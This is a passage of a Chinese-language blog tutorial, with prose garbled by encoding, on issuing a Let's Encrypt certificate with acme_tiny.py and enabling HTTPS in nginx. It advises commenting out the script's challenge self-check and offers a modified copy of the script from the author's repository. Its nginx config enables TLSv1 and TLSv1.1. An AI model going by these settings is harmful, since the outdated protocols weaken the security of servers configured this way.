class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &amp;gt; ./signed.crt&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing account key...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing CSR...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Registering account...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Already registered!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Verifying ihaozhuo.com...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Traceback (most recent call last):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&quot;acme_tiny.py&quot;&lt;/span&gt;, line 198, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    main(sys.argv[1:])&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&quot;acme_tiny.py&quot;&lt;/span&gt;, line 194, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; main&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    signed_crt = get_crt(args.account_key, args.csr, args.acme_dir, &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;=LOGGER, CA=args.ca)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&quot;acme_tiny.py&quot;&lt;/span&gt;, line 123, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; get_crt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    wellknown_path, wellknown_url))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ValueError: Wrote file to /var/www/challenges/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg, but couldn&lt;span class=&quot;string&quot;&gt;&#39;t download http://ihaozhuo.com/.well-known/acme-challenge/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;5ï¼‰è„šæœ¬é—®é¢˜ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è®°å¾—åœ¨ç½‘ç«™è®°å¾—åŸŸåè§£æè¦å¯¹ï¼Œéƒ½æ˜¯ä½ ç°åœ¨ç”³è¯·è¯ä¹¦è¿™å°å¤–ç½‘è§£æåœ°å€ï¼š &lt;code&gt;http://ihaozhuo.com/&lt;/code&gt;ä¸é€šé‚£è§£æå°±å‡ºç°é—®é¢˜äº†ã€‚&lt;/li&gt;
&lt;li&gt;ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šäººè¯´åŸŸåDNSæœåŠ¡å™¨è§£æå¯¼è‡´åŸŸåä¸è¡Œï¼Œè¿™ä¸ªéªŒè¯äº†ä»¥åä¸æ˜¯çš„ï¼Œè¿™ä¸ªæ˜¯GitHubè¿™ä¸ªè„šæœ¬&lt;code&gt;acme_tiny.py&lt;/code&gt;é—®é¢˜å¯¼è‡´çš„ï¼Œéœ€è¦ç¼–è¾‘è„šæœ¬æ³¨é‡Šæ‰ä¸‹é¢å…¨éƒ¨å†…å®¹å³å¯ 116è¡Œ-123è¡Œï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#  try:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#     resp = urlopen(wellknown_url)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#    resp_data = resp.read().decode(&#39;utf8&#39;).strip()&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#   assert resp_data == keyauthorization&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;# except (IOError, AssertionError):&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#    os.remove(wellknown_path)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#   raise ValueError(&quot;Wrote file to &amp;#123;0&amp;#125;, but couldn&#39;t download &amp;#123;1&amp;#125;&quot;.format(&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;#      wellknown_path, wellknown_url))&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚æœä¿®æ”¹æ²¡æœ‰ç”¨ï¼Œå¯ä»¥åˆ°æˆ‘è¿™é‡Œä¸‹è½½Githubä¸‹è½½&lt;a href=&quot;https://github.com/yangcvo/Let-s-Encrypt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;acme_tiny.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6ï¼‰ç„¶åä¿å­˜å†æ¬¡è·å–ç½‘ç«™è¯ä¹¦&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &amp;gt; ./signed.crt&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing account key...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Parsing CSR...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Registering account...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Already registered!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Verifying ihaozhuo.com...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ihaozhuo.com verified!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Verifying www.ihaozhuo.com...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;www.ihaozhuo.com verified!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Signing certificate...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Certificate signed!&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/zhengshu2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ãŠ—ï¸ å¦‚æœçœ‹åˆ°å¦‚ä¸Šå†…å®¹ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ çš„ç½‘ç«™è¯ä¹¦å·²ç»æˆåŠŸè·å–äº†ã€‚è¿™æ—¶å€™æŸ¥çœ‹ç›®å½•ä¸‹é¢æœ‰å¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# ll&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ€»ç”¨é‡ 36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3æœˆ  30 16:42 account.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;drwxr-xr-x 4 root root 4096 3æœˆ  30 17:31 acme-tiny&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 9159 3æœˆ  30 19:23 acme_tiny.py&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 1639 3æœˆ  30 17:00 domain.csr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3æœˆ  30 16:53 domain.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 2159 3æœˆ  30 22:11 signed.crt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬å·²ç»æˆåŠŸç”³è¯·åˆ°Letâ€™sENcrpytçš„ç½‘ç«™è¯ä¹¦ï¼Œå¯¹äºNginxç”¨æˆ·æˆ‘ä»¬è¿˜éœ€è¦æŠŠLetâ€™s ENcrpytçš„ä¸­é—´è¯ä¹¦åŠ å…¥åˆ°åˆšåˆšç”Ÿæˆçš„signed.crtæ–‡ä»¶ä¸­ã€‚å…·ä½“æ“ä½œï¼š&lt;/p&gt;
&lt;h3 id=&quot;ç¬¬äº”æ­¥ï¼šå®‰è£…è¯ä¹¦&quot;&gt;&lt;a href=&quot;#ç¬¬äº”æ­¥ï¼šå®‰è£…è¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äº”æ­¥ï¼šå®‰è£…è¯ä¹¦&quot;&gt;&lt;/a&gt;ç¬¬äº”æ­¥ï¼šå®‰è£…è¯ä¹¦&lt;/h3&gt;&lt;p&gt;è¯ä¹¦ç”Ÿæˆåï¼Œå°±å¯ä»¥æŠŠå®ƒé…ç½®åœ¨web æœåŠ¡å™¨ä¸Šäº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒNginxéœ€è¦è¿½åŠ ä¸€ä¸ªLetâ€™s Encryptçš„ä¸­é—´è¯ä¹¦ï¼Œåœ¨ Nginx é…ç½®ä¸­ï¼Œéœ€è¦æŠŠä¸­é—´è¯ä¹¦å’Œç½‘ç«™è¯ä¹¦åˆåœ¨ä¸€èµ·ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &amp;gt; intermediate.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat signed.crt intermediate.pem &amp;gt; chained.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# ll&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ€»ç”¨é‡ 36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3æœˆ  30 22:06 account.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 9159 3æœˆ  30 19:23 acme_tiny.py&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3834 3æœˆ  30 22:51 chained.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 1639 3æœˆ  30 22:07 domain.csr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 3243 3æœˆ  30 22:06 domain.key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 1675 3æœˆ  30 22:51 intermediate.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-rw-r--r-- 1 root root 2159 3æœˆ  30 22:51 signed.crt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;1ï¼‰ç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨Nginxå¯åŠ¨HTTPSï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ä½ ä¹‹å‰ç½‘ç«™Nginx.confé‡Œé¢é…ç½®&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„âš ï¸ ï¼šä¸ºäº†ä¸å½±å“ç°åœ¨æ­£åœ¨è¿è¡Œçš„ç½‘ç«™ï¼Œåœ¨é…ç½®HTTPSçš„æ—¶å€™æœ€å¥½å°†ä½ ç°åœ¨é…ç½®å¥½çš„æ–‡ä»¶å…¨éƒ¨å¤‡ä»½èµ·æ¥ï¼Œè¿™æ ·ä½ åœ¨å¯åŠ¨HTTPSå‡ºç°é—®é¢˜å¯ä»¥èƒ½å¤Ÿå¿«é€Ÿæ¢å¤å›æ¥ã€‚&lt;/p&gt;
&lt;p&gt;Nginxé…ç½®æ–‡ä»¶åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen 80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    server_name ihaozhuo.com, www.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    location /.well-known/acme-challenge/ &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;alias&lt;/span&gt; /var/www/challenges/;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        try_files &lt;span class=&quot;variable&quot;&gt;$uri&lt;/span&gt; =404;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ...the rest of your config&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen 443;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    server_name ihaozhuo.com, www.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_certificate /srv/ssl/chained.pem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_certificate_key /srv/ssl/domain.key;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_session_timeout 5m;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_session_cache shared:SSL:50m;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ssl_prefer_server_ciphers on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ...the rest of your config&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨Chromeæµè§ˆå™¨é‡Œé¢ä½ å¯ä»¥è®¿é—®httpså¼€å¤´çš„ï¼Œä½†æ²¡æœ‰çœ‹åˆ°ç»¿è‰²é”æ ‡è®°ï¼Œè¿™æ˜¯å› ä¸ºä½ ç½‘ç«™æœ‰è¯·æ±‚&lt;code&gt;http://xxx&lt;/code&gt;èµ„æºï¼Œè¿™ä¸ªé—®é¢˜æˆ‘é‡åˆ°ä»¥åæŸ¥äº†å¾ˆå¤šï¼Œå› ä¸ºæˆ‘ç½‘ç«™å¾ˆæ—©ä¹‹å‰å°±æœ‰äº†ï¼Œé‡Œé¢é…ç½®çš„åœ°å€éƒ½æ˜¯httpè¦ä¿®æ”¹è¿‡æ¥éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥ç”³è¯·è¯ä¹¦ä¸€å¼€å§‹åŸŸåä¸‹æ¥å°±è¦ç”³è¯·è¿™æ˜¯æœ€å¥½çš„ï¼Œå¦‚æœä½ æƒ…å†µå·²ç»è·Ÿæˆ‘ä¸€æ ·ï¼Œé‚£ä½ éœ€è¦æŠŠæ‰€æœ‰çš„&lt;code&gt;http://xxxx&lt;/code&gt; èµ„æºå…¨éƒ¨åˆ‡æ¢æˆï¼š&lt;a href=&quot;https://xxx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://xxx&lt;/a&gt; çš„èµ„æºï¼Œè¿™æ ·ç»¿è‰²çš„é”æ‰ä¼šå‡ºç°ã€‚&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/zhengshu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;ç¬¬å…­æ­¥ï¼šå®šæœŸæ›´æ–°&quot;&gt;&lt;a href=&quot;#ç¬¬å…­æ­¥ï¼šå®šæœŸæ›´æ–°&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬å…­æ­¥ï¼šå®šæœŸæ›´æ–°&quot;&gt;&lt;/a&gt;ç¬¬å…­æ­¥ï¼šå®šæœŸæ›´æ–°&lt;/h3&gt;&lt;p&gt;è®¿é—®æŸ¥çœ‹ä¸‹ç½‘ç«™è¯¦ç»†ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 conf]&lt;span class=&quot;comment&quot;&gt;#  curl -v https://www.ihaozhuo.com/home.html&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* About to connect() to www.ihaozhuo.com port 443 (&lt;span class=&quot;comment&quot;&gt;#0)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*   Trying 120.27.185.86...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Connected to www.ihaozhuo.com (120.27.185.86) port 443 (&lt;span class=&quot;comment&quot;&gt;#0)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Initializing NSS with certpath: sql:/etc/pki/nssdb&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*   CAfile: /etc/pki/tls/certs/ca-bundle.crt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  CApath: none&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Server certificate:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	subject: CN=ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	start date: 3æœˆ 30 13:51:00 2017 GMT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	expire date: 6æœˆ 28 13:51:00 2017 GMT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	common name: ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* 	issuer: CN=Let&lt;span class=&quot;string&quot;&gt;&#39;s Encrypt Authority X3,O=Let&#39;&lt;/span&gt;s Encrypt,C=US&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* NSS error -8179 (SEC_ERROR_UNKNOWN_ISSUER)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Peer&lt;span class=&quot;string&quot;&gt;&#39;s Certificate issuer is not recognized.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;* Closing connection 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;curl: (60) Peer&#39;s Certificate issuer is not recognized.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;More details here: http://curl.haxx.se/docs/sslcerts.html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;curl performs SSL certificate verification by default, using a &lt;span class=&quot;string&quot;&gt;&quot;bundle&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; of Certificate Authority (CA) public keys (CA certs). If the default&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; bundle file isn&lt;span class=&quot;string&quot;&gt;&#39;t adequate, you can specify an alternate file&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; using the --cacert option.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If this HTTPS server uses a certificate signed by a CA represented in&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; the bundle, the certificate verification probably failed due to a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; problem with the certificate (it might be expired, or the name might&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; not match the domain name in the URL).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;If you&#39;d like to turn off curl&lt;span class=&quot;string&quot;&gt;&#39;s verification of the certificate, use&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; the -k (or --insecure) option.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Letâ€™s Encrypt ç­¾å‘çš„è¯ä¹¦åªæœ‰90å¤©æœ‰æ•ˆæœŸï¼Œä½†å¯ä»¥é€šè¿‡è„šæœ¬å®šæœŸæ›´æ–°ã€‚ä½ å¯ä»¥åˆ›å»ºäº†ä¸€ä¸ªè‡ªåŠ¨æ›´æ–°è„šæœ¬&lt;code&gt;renew_cert.sh&lt;/code&gt;ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
